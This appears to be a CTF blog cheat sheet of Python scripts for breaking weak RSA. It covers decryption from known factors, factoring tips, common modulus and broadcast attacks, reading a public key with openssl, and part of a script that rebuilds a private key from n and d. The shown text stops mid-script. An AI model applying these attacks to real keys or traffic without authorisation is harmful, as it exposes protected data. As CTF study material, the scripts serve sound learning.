        <content type="html"><![CDATA[<p>IN CTF,Rsa often appears.BUT in ctf it’s usually with Fixed method to solve it.<br>Today,I put all code to here.</p><a id="more"></a><h1 id="1-have-p-q-e-compute-d-or-p-q-e-c-to-decrypte-ciphertext"><a href="#1-have-p-q-e-compute-d-or-p-q-e-c-to-decrypte-ciphertext" class="headerlink" title="1.have p,q,e.compute d or p,q,e,c to decrypte ciphertext"></a>1.have p,q,e.compute d or p,q,e,c to decrypte ciphertext</h1><p>you should note that e should be a prime number</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">computeD</span><span class="token punctuation">(</span>fn<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> r<span class="token punctuation">)</span> <span class="token operator">=</span> extendedGCD<span class="token punctuation">(</span>fn<span class="token punctuation">,</span> e<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#y maybe &lt; 0, so convert it</span>    <span class="token keyword">if</span> y <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> fn <span class="token operator">+</span> y    <span class="token keyword">return</span> y<span class="token keyword">def</span> <span class="token function">extendedGCD</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#a*xi + b*yi = ri</span>    <span class="token keyword">if</span> b <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#a*x1 + b*y1 = a</span>    x1 <span class="token operator">=</span> <span class="token number">1</span>    y1 <span class="token operator">=</span> <span class="token number">0</span>    <span class="token comment" spellcheck="true">#a*x2 + b*y2 = b</span>    x2 <span class="token operator">=</span> <span class="token number">0</span>    y2 <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">while</span> b <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>        q <span class="token operator">=</span> a <span class="token operator">/</span> b        <span class="token comment" spellcheck="true">#ri = r(i-2) % r(i-1)</span>        r <span class="token operator">=</span> a <span class="token operator">%</span> b        a <span class="token operator">=</span> b        b <span class="token operator">=</span> r        <span class="token comment" spellcheck="true">#xi = x(i-2) - q*x(i-1)</span>        x <span class="token operator">=</span> x1 <span class="token operator">-</span> q<span class="token operator">*</span>x2        x1 <span class="token operator">=</span> x2        x2 <span class="token operator">=</span> x        <span class="token comment" spellcheck="true">#yi = y(i-2) - q*y(i-1)</span>        y <span class="token operator">=</span> y1 <span class="token operator">-</span> q<span class="token operator">*</span>y2        y1 <span class="token operator">=</span> y2        y2 <span class="token operator">=</span> y    <span class="token keyword">return</span><span class="token punctuation">(</span>x1<span class="token punctuation">,</span> y1<span class="token punctuation">,</span> a<span class="token punctuation">)</span>c<span class="token operator">=</span><span class="token number">174351854900966188977904987134427781775272319015132758864873306597577750098226384697676493069934493337172878644704026414143158278061735487156753876228693871133246943987986736376334978394288726798629969739682159093341216933569685433834399066431572596217448890045449452777575588109633903180187737151526697202981068022052927269776042366636567373169048897053407525377739061532954622334926090886616814795353343617608514882733311276797401041432521552887309768062119475432313577704285175154999953744808693060762751860890138121483113217037477525088532442342551435801844941921381421754649633057679452893025326942215634059805893</span>e<span class="token operator">=</span><span class="token number">65537</span>p<span class="token operator">=</span><span class="token number">7</span>n<span class="token operator">=</span><span class="token number">327686759455107101770244900847669909444589048412360834576685246062688127536081099083429267251807434658755027942434088691531411358608813564103474260906760890856572316124720411994944452029909143528618601332276557030331449922914588098651910546381598167047448472663466757577538599646576321101391165156123505615545132362901633176715824845507656500702749953003718520197296421627262166996961876028666789909011002781946123522101211391085819205716356811390841768572223338428099889208616922338336413929957447204562949543074397015746616534379026758490398097163404992258919511999330535101502534548628286576966950951725386015104827</span>q<span class="token operator">=</span>n<span class="token operator">/</span><span class="token number">7</span>fn<span class="token operator">=</span><span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> computeD<span class="token punctuation">(</span>fn<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span>m <span class="token operator">=</span> pow<span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="2-factor-N"><a href="#2-factor-N" class="headerlink" title="2. factor N"></a>2. factor N</h1><p>if n&lt;256bit or n have two close number.yafu and <a href="https://factordb.com/">foctordb</a> will be very helpful.<br>Note:yafu in windows or in linux is not same.you can try both of them.</p><h1 id="3-Common-Modulus-Attack"><a href="#3-Common-Modulus-Attack" class="headerlink" title="3. Common Modulus Attack"></a>3. Common Modulus Attack</h1><p>if use the same n to encrypt the same m. Common Modulus Attack is useful.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding=utf-8</span><span class="token keyword">import</span> string<span class="token keyword">import</span> gmpy<span class="token keyword">def</span> <span class="token function">egcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> a <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> b<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        g<span class="token punctuation">,</span> y<span class="token punctuation">,</span> x <span class="token operator">=</span> egcd<span class="token punctuation">(</span>b <span class="token operator">%</span> a<span class="token punctuation">,</span> a<span class="token punctuation">)</span>        <span class="token keyword">return</span> g<span class="token punctuation">,</span> x <span class="token operator">-</span> b <span class="token operator">//</span> a <span class="token operator">*</span> y<span class="token punctuation">,</span> y<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    c1<span class="token operator">=</span><span class="token number">3453520592723443935451151545245025864232388871721682326408915024349804062041976702364728660682912396903968193981131553111537349</span>    c2<span class="token operator">=</span><span class="token number">5672818026816293344070119332536629619457163570036305296869053532293105379690793386019065754465292867769521736414170803238309535</span>    n <span class="token operator">=</span> <span class="token number">6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249</span>    e1 <span class="token operator">=</span> <span class="token number">773</span>    e2 <span class="token operator">=</span> <span class="token number">839</span>    s <span class="token operator">=</span> egcd<span class="token punctuation">(</span>e1<span class="token punctuation">,</span> e2<span class="token punctuation">)</span>    s1 <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    s2 <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> s1 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>        s1 <span class="token operator">=</span> <span class="token operator">-</span>s1        c1 <span class="token operator">=</span> gmpy<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    <span class="token keyword">elif</span> s2 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>        s2 <span class="token operator">=</span> <span class="token operator">-</span>s2        c2 <span class="token operator">=</span> gmpy<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>c2<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    m <span class="token operator">=</span> pow<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> s1<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">*</span> pow<span class="token punctuation">(</span>c2<span class="token punctuation">,</span> s2<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">%</span> n    <span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'try:'</span><span class="token punctuation">,</span><span class="token string">'&amp;#123;:x&amp;#125;'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>int<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    q<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">103</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">,</span><span class="token number">119</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">119</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">107</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">98</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">125</span><span class="token punctuation">]</span>    s<span class="token operator">=</span><span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> q<span class="token punctuation">:</span>        s<span class="token operator">+=</span>chr<span class="token punctuation">(</span>int<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="4-Basic-Broadcast-Attack"><a href="#4-Basic-Broadcast-Attack" class="headerlink" title="4. Basic Broadcast Attack"></a>4. Basic Broadcast Attack</h1><p>use the same e to encrypte the same m.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding:utf8</span><span class="token keyword">from</span> struct <span class="token keyword">import</span> pack<span class="token punctuation">,</span>unpack<span class="token keyword">import</span> zlib<span class="token keyword">import</span> gmpy<span class="token keyword">def</span> <span class="token function">my_parse_number</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">:</span>    string <span class="token operator">=</span> <span class="token string">"%x"</span> <span class="token operator">%</span> number    <span class="token comment" spellcheck="true">#if len(string) != 64:</span>    <span class="token comment" spellcheck="true">#    return ""</span>    erg <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">while</span> string <span class="token operator">!=</span> <span class="token string">''</span><span class="token punctuation">:</span>        erg <span class="token operator">=</span> erg <span class="token operator">+</span> <span class="token punctuation">[</span>chr<span class="token punctuation">(</span>int<span class="token punctuation">(</span>string<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        string <span class="token operator">=</span> string<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>erg<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">extended_gcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    x<span class="token punctuation">,</span>y <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span>    lastx<span class="token punctuation">,</span> lasty <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span>    <span class="token keyword">while</span> b<span class="token punctuation">:</span>        a<span class="token punctuation">,</span> <span class="token punctuation">(</span>q<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token operator">=</span> b<span class="token punctuation">,</span> divmod<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>        x<span class="token punctuation">,</span> lastx <span class="token operator">=</span> lastx<span class="token operator">-</span>q<span class="token operator">*</span>x<span class="token punctuation">,</span> x        y<span class="token punctuation">,</span> lasty <span class="token operator">=</span> lasty<span class="token operator">-</span>q<span class="token operator">*</span>y<span class="token punctuation">,</span> y    <span class="token keyword">return</span> <span class="token punctuation">(</span>lastx<span class="token punctuation">,</span> lasty<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">chinese_remainder_theorem</span><span class="token punctuation">(</span>items<span class="token punctuation">)</span><span class="token punctuation">:</span>  N <span class="token operator">=</span> <span class="token number">1</span>  <span class="token keyword">for</span> a<span class="token punctuation">,</span> n <span class="token keyword">in</span> items<span class="token punctuation">:</span>    N <span class="token operator">*=</span> n  result <span class="token operator">=</span> <span class="token number">0</span>  <span class="token keyword">for</span> a<span class="token punctuation">,</span> n <span class="token keyword">in</span> items<span class="token punctuation">:</span>    m <span class="token operator">=</span> N<span class="token operator">/</span>n    r<span class="token punctuation">,</span> s<span class="token punctuation">,</span> d <span class="token operator">=</span> extended_gcd<span class="token punctuation">(</span>n<span class="token punctuation">,</span> m<span class="token punctuation">)</span>    <span class="token keyword">if</span> d <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>      N<span class="token operator">=</span>N<span class="token operator">/</span>n      <span class="token keyword">continue</span>      <span class="token comment" spellcheck="true">#raise "Input not pairwise co-prime"</span>    result <span class="token operator">+=</span> a<span class="token operator">*</span>s<span class="token operator">*</span>m  <span class="token keyword">return</span> result <span class="token operator">%</span> N<span class="token punctuation">,</span> Nsessions<span class="token operator">=</span><span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;"c": 7366067574741171461722065133242916080495505913663250330082747465383676893970411476550748394841437418105312353971095003424322679616940371123028982189502042, "e": 10, "n": 25162507052339714421839688873734596177751124036723831003300959761137811490715205742941738406548150240861779301784133652165908227917415483137585388986274803&amp;#125;,</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;"c": 21962825323300469151795920289886886562790942771546858500842179806566435767103803978885148772139305484319688249368999503784441507383476095946258011317951461, "e": 10, "n": 23976859589904419798320812097681858652325473791891232710431997202897819580634937070900625213218095330766877190212418023297341732808839488308551126409983193&amp;#125;,</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;"c": 6569689420274066957835983390583585286570087619048110141187700584193792695235405077811544355169290382357149374107076406086154103351897890793598997687053983, "e": 10, "n": 18503782836858540043974558035601654610948915505645219820150251062305120148745545906567548650191832090823482852604346478335353784501076761922605361848703623&amp;#125;,</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;"c": 4508246168044513518452493882713536390636741541551805821790338973797615971271867248584379813114125478195284692695928668946553625483179633266057122967547052, "e": 10, "n": 23383087478545512218713157932934746110721706819077423418060220083657713428503582801909807142802647367994289775015595100541168367083097506193809451365010723&amp;#125;,</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;"c": 22966105670291282335588843018244161552764486373117942865966904076191122337435542553276743938817686729554714315494818922753880198945897222422137268427611672, "e": 10, "n": 31775649089861428671057909076144152870796722528112580479442073365053916012507273433028451755436987054722496057749731758475958301164082755003195632005308493&amp;#125;,</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;"c": 17963313063405045742968136916219838352135561785389534381262979264585397896844470879023686508540355160998533122970239261072020689217153126649390825646712087, "e": 10, "n": 22246342022943432820696190444155665289928378653841172632283227888174495402248633061010615572642126584591103750338919213945646074833823905521643025879053949&amp;#125;,</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;"c": 1652417534709029450380570653973705320986117679597563873022683140800507482560482948310131540948227797045505390333146191586749269249548168247316404074014639, "e": 10, "n": 25395461142670631268156106136028325744393358436617528677967249347353524924655001151849544022201772500033280822372661344352607434738696051779095736547813043&amp;#125;,</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;"c": 15585771734488351039456631394040497759568679429510619219766191780807675361741859290490732451112648776648126779759368428205194684721516497026290981786239352, "e": 10, "n": 32056508892744184901289413287728039891303832311548608141088227876326753674154124775132776928481935378184756756785107540781632570295330486738268173167809047&amp;#125;,</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;"c": 8965123421637694050044216844523379163347478029124815032832813225050732558524239660648746284884140746788823681886010577342254841014594570067467905682359797, "e": 10, "n": 52849766269541827474228189428820648574162539595985395992261649809907435742263020551050064268890333392877173572811691599841253150460219986817964461970736553&amp;#125;,</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;"c": 13560945756543023008529388108446940847137853038437095244573035888531288577370829065666320069397898394848484847030321018915638381833935580958342719988978247, "e": 10, "n": 30415984800307578932946399987559088968355638354344823359397204419191241802721772499486615661699080998502439901585573950889047918537906687840725005496238621&amp;#125;]</span>data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> session <span class="token keyword">in</span> sessions<span class="token punctuation">:</span>    e<span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">'e'</span><span class="token punctuation">]</span>    n<span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">'n'</span><span class="token punctuation">]</span>    msg<span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span>    data <span class="token operator">=</span> data <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"-"</span> <span class="token operator">*</span> <span class="token number">80</span><span class="token keyword">print</span> <span class="token string">"Please wait, performing CRT"</span>x<span class="token punctuation">,</span> n <span class="token operator">=</span> chinese_remainder_theorem<span class="token punctuation">(</span>data<span class="token punctuation">)</span>e<span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">'e'</span><span class="token punctuation">]</span>realnum <span class="token operator">=</span> gmpy<span class="token punctuation">.</span>mpz<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>root<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>digits<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> my_parse_number<span class="token punctuation">(</span>int<span class="token punctuation">(</span>realnum<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>tips: usually if e=3,choose 3 groups;if e=10,choose 7 groups.</p><h1 id="5-use-openssl-to-decrypte"><a href="#5-use-openssl-to-decrypte" class="headerlink" title="5.use openssl to decrypte"></a>5.use openssl to decrypte</h1><h2 id="read-public-pem"><a href="#read-public-pem" class="headerlink" title="read public.pem"></a>read public.pem</h2><p>use openssl</p><pre class="line-numbers language-bash"><code class="language-bash">openssl rsa -pubin -in pubkey.pem -text -modulus<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>or use python</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA<span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'./pubkey.pem'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    key <span class="token operator">=</span> RSA<span class="token punctuation">.</span>importKey<span class="token punctuation">(</span>f<span class="token punctuation">)</span>    n <span class="token operator">=</span> key<span class="token punctuation">.</span>n    e <span class="token operator">=</span> key<span class="token punctuation">.</span>e<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="generate-the-private-pem"><a href="#generate-the-private-pem" class="headerlink" title="generate the private.pem"></a>generate the private.pem</h2><p>we should use rsatools.py</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python2</span><span class="token keyword">import</span> base64<span class="token punctuation">,</span> fractions<span class="token punctuation">,</span> optparse<span class="token punctuation">,</span> random<span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token keyword">import</span> gmpy<span class="token keyword">except</span> ImportError <span class="token keyword">as</span> e<span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">import</span> gmpy2 <span class="token keyword">as</span> gmpy    <span class="token keyword">except</span> ImportError<span class="token punctuation">:</span>        <span class="token keyword">raise</span> e<span class="token keyword">from</span> pyasn1<span class="token punctuation">.</span>codec<span class="token punctuation">.</span>der <span class="token keyword">import</span> encoder<span class="token keyword">from</span> pyasn1<span class="token punctuation">.</span>type<span class="token punctuation">.</span>univ <span class="token keyword">import</span> <span class="token operator">*</span>PEM_TEMPLATE <span class="token operator">=</span> <span class="token string">'-----BEGIN RSA PRIVATE KEY-----\n%s-----END RSA PRIVATE KEY-----\n'</span>DEFAULT_EXP <span class="token operator">=</span> <span class="token number">65537</span><span class="token keyword">def</span> <span class="token function">factor_modulus</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> d<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    Efficiently recover non-trivial factors of n    See: Handbook of Applied Cryptography    8.2.2 Security of RSA -> (i) Relation to factoring (p.287)    http://www.cacr.math.uwaterloo.ca/hac/    """</span>    t <span class="token operator">=</span> <span class="token punctuation">(</span>e <span class="token operator">*</span> d <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>    s <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        quotient<span class="token punctuation">,</span> remainder <span class="token operator">=</span> divmod<span class="token punctuation">(</span>t<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> remainder <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        s <span class="token operator">+=</span> <span class="token number">1</span>        t <span class="token operator">=</span> quotient    found <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token keyword">while</span> <span class="token operator">not</span> found<span class="token punctuation">:</span>        i <span class="token operator">=</span> <span class="token number">1</span>        a <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>n<span class="token number">-1</span><span class="token punctuation">)</span>        <span class="token keyword">while</span> i <span class="token operator">&lt;=</span> s <span class="token operator">and</span> <span class="token operator">not</span> found<span class="token punctuation">:</span>            c1 <span class="token operator">=</span> pow<span class="token punctuation">(</span>a<span class="token punctuation">,</span> pow<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> i<span class="token number">-1</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">*</span> t<span class="token punctuation">,</span> n<span class="token punctuation">)</span>            c2 <span class="token operator">=</span> pow<span class="token punctuation">(</span>a<span class="token punctuation">,</span> pow<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">*</span> t<span class="token punctuation">,</span> n<span class="token punctuation">)</span>            found <span class="token operator">=</span> c1 <span class="token operator">!=</span> <span class="token number">1</span> <span class="token operator">and</span> c1 <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">%</span> n<span class="token punctuation">)</span> <span class="token operator">and</span> c2 <span class="token operator">==</span> <span class="token number">1</span>            i <span class="token operator">+=</span> <span class="token number">1</span>    p <span class="token operator">=</span> fractions<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>c1<span class="token number">-1</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span>    q <span class="token operator">=</span> <span class="token punctuation">(</span>n <span class="token operator">/</span> p<span class="token punctuation">)</span>    <span class="token keyword">return</span> p<span class="token punctuation">,</span> q<span class="token keyword">class</span> <span class="token class-name">RSA</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> p<span class="token operator">=</span>None<span class="token punctuation">,</span> q<span class="token operator">=</span>None<span class="token punctuation">,</span> n<span class="token operator">=</span>None<span class="token punctuation">,</span> d<span class="token operator">=</span>None<span class="token punctuation">,</span> e<span class="token operator">=</span>DEFAULT_EXP<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        Initialize RSA instance using primes (p, q)        or modulus and private exponent (n, d)        """</span>        self<span class="token punctuation">.</span>e <span class="token operator">=</span> e        <span class="token keyword">if</span> p <span class="token operator">and</span> q<span class="token punctuation">:</span>            <span class="token keyword">assert</span> gmpy<span class="token punctuation">.</span>is_prime<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'p is not prime'</span>            <span class="token keyword">assert</span> gmpy<span class="token punctuation">.</span>is_prime<span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'q is not prime'</span>            self<span class="token punctuation">.</span>p <span class="token operator">=</span> p            self<span class="token punctuation">.</span>q <span class="token operator">=</span> q        <span class="token keyword">elif</span> n <span class="token operator">and</span> d<span class="token punctuation">:</span>               self<span class="token punctuation">.</span>p<span class="token punctuation">,</span> self<span class="token punctuation">.</span>q <span class="token operator">=</span> factor_modulus<span class="token punctuation">(</span>n<span class="token punctuation">,</span> d<span class="token punctuation">,</span> e<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">raise</span> ArgumentError<span class="token punctuation">(</span><span class="token string">'Either (p, q) or (n, d) must be provided'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>_calc_values<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">_calc_values</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>n <span class="token operator">=</span> self<span class="token punctuation">.</span>p <span class="token operator">*</span> self<span class="token punctuation">.</span>q        <span class="token keyword">if</span> self<span class="token punctuation">.</span>p <span class="token operator">!=</span> self<span class="token punctuation">.</span>q<span class="token punctuation">:</span>            phi <span class="token operator">=</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            phi <span class="token operator">=</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>p <span class="token operator">**</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">-</span> self<span class="token punctuation">.</span>p        self<span class="token punctuation">.</span>d <span class="token operator">=</span> gmpy<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>self<span class="token punctuation">.</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 